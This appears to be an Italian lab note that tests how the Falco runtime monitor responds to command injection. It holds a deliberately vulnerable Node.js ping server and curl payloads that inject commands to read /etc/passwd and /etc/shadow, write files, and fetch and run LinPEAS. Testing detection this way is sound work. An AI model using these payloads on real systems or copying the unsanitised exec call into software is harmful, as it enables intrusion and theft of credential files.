# Test RCE
## Setup
```javascript
// app.js
const http = require('http');
const { exec } = require('child_process');
const url = require('url');

const PORT = 9001;

const server = http.createServer((req, res) => {
  const queryObject = url.parse(req.url, true).query;
  const host = queryObject.host || '127.0.0.1';

  exec(`ping -c 1 ${host}`, (error, stdout, stderr) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(`STDOUT:\n${stdout}\nSTDERR:\n${stderr}`);
  });
});

server.listen(PORT, () => {
  console.log(`Vulnerable web app listening on port: ${PORT}`);
});
```
## Reazioni
``` bash
# Pod da cui lanciare gli attacchi
kubectl run attacker -n demo-targets --rm -i --tty --image=curlimages/curl -- sh
```
### Falco
#### Lettura file generici
```bash
curl 'http://vulnerable-web-service/ping?host=127.0.0.1;cat%20/etc/passwd'
```
Con configurazione di base, produce un **Notice**: `Redirect stdout/stdin to network connection`.

#### Lettura file sensibili
```bash
curl 'http://vulnerable-web-service/ping?host=127.0.0.1;cat%20/etc/shadow'
```
Con configurazione di base, produce un **Warning**: `Sensitive file opened for reading by non-trusted program`.

#### Esecuzione comandi
```bash
curl 'http://vulnerable-web-service/ping?host=127.0.0.1;ls%20-al'
# oppure
curl 'http://vulnerable-web-service/ping?host=127.0.0.1;whoami'
```
Con configurazione di base, produce un **Notice**: `Redirect stdout/stdin to network connection`.

#### Scrittura file
```bash
curl 'http://vulnerable-web-service/ping?host=127.0.0.1;echo%20"payload"%20>>%20/tmp/payload.txt;cat%20/tmp/payload.txt'
```
Con configurazione di base, produce un **Notice**: `Redirect stdout/stdin to network connection`.

#### Esecuzione LinPEAS
```bash
curl 'http://vulnerable-web-service/ping?host=127.0.0.1;wget%20https://github%2Ecom/carlospolop/PEASS%2Dng/releases/latest/download/linpeas%2Esh;chmod%20+x%20linpeas%2Esh;sh%20linpeas%2Esh'
```
Con configurazione di base, produce un **Warning**: `Grep private keys or passwords activities found`.